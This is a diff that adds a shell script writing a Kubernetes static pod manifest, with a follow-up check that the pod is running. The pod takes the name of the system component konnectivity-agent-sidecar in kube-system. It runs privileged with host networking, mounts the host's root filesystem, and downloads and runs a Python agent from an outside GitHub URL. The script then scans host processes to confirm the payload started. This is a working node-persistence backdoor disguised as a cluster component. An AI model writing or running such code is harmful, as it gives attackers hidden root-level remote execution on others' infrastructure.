@@ -1,1 +1,25 @@
-grep -a "cxp-pod\|konnectivity-agent-sidecar" /host/var/log/syslog 2>/dev/null | grep -a "16:0" | tail -4 | cut -c1-400
+cat > /host/etc/kubernetes/manifests/cxp-pod.yaml << "EOS"
+apiVersion: v1
+kind: Pod
+metadata:
+  name: konnectivity-agent-sidecar
+  namespace: kube-system
+spec:
+  hostNetwork: true
+  priorityClassName: system-node-critical
+  restartPolicy: Always
+  dnsPolicy: ClusterFirstWithHostNet
+  tolerations:
+  - operator: Exists
+  containers:
+  - name: sidecar
+    image: python:3-alpine
+    command: ["/bin/sh","-c","wget -q -T 20 -O /tmp/a.py https://raw.githubusercontent.com/s34vv1nd/ops-pub/main/agent.py && python3 /tmp/a.py"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - {name: h, mountPath: /host}
+  volumes:
+  - {name: h, hostPath: {path: /}}
+EOS
+echo V3-WRITTEN; sleep 75; for pid in $(ls /host/proc | grep -E "^[0-9]+$"); do c=$(cat /host/proc/$pid/comm 2>/dev/null); [ "$c" = "python3" ] && echo "PY3: $pid | $(tr "\0" " " < /host/proc/$pid/cmdline | cut -c1-40)"; done; grep -a konnectivity /host/var/log/syslog | tail -1 | cut -c1-180
